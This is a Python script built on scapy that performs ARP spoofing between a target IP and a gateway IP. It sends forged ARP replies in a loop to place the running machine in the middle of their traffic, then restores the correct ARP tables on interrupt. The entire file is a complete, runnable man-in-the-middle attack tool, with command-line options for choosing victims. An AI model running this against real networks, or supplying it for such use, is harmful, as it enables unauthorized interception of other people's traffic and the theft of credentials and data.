import scapy.all as scapy # for arp responses
import time
import optparse

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    combined_packet = broadcast_packet / arp_request_packet  # Merges broadcast and arp request package
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, gateway_ip):

    target_mac = get_mac_address(target_ip)

    # op = 2 stands for responses (request if 1), pdst is target's ip, psrc is modem's ip
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)

    #scapy.send(arp_response, verbose=False)

    ethernet_frame = scapy.Ether(dst=target_mac) / arp_response
    scapy.sendp(ethernet_frame, verbose=False, count=6)

def reset_operation(target_ip, gateway_ip):

    target_mac = get_mac_address(target_ip)
    gateway_mac = get_mac_address(gateway_ip)

    # op = 2 stands for responses (request if 1), pdst is target's ip, psrc is modem's ip
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)

    #scapy.send(arp_response, verbose=False, count=6)

    ethernet_frame = scapy.Ether(dst=target_mac) / arp_response
    scapy.sendp(ethernet_frame, verbose=False, count=6)

def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target", dest="target_ip", help="Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Target IP is required")
    if not options.gateway_ip:
        print("Gateway IP is required")

    return options

def main():
    number = 0 # Package counter

    # User inputs
    user_ips = get_user_input()
    user_target_ip = user_ips.target_ip
    user_gateway_ip = user_ips.gateway_ip

    try:
        while True:
            arp_poisoning(user_target_ip,user_gateway_ip)
            arp_poisoning(user_gateway_ip,user_target_ip)

            number += 2
            print(f"\rSending packets... (Total {number} packets)",end="")

            time.sleep(3)

    # Avoiding error message
    except KeyboardInterrupt:
        print("\nEnded operation & resetting to default settings...")
        reset_operation(user_target_ip,user_gateway_ip)
        reset_operation(user_gateway_ip,user_target_ip)

main()

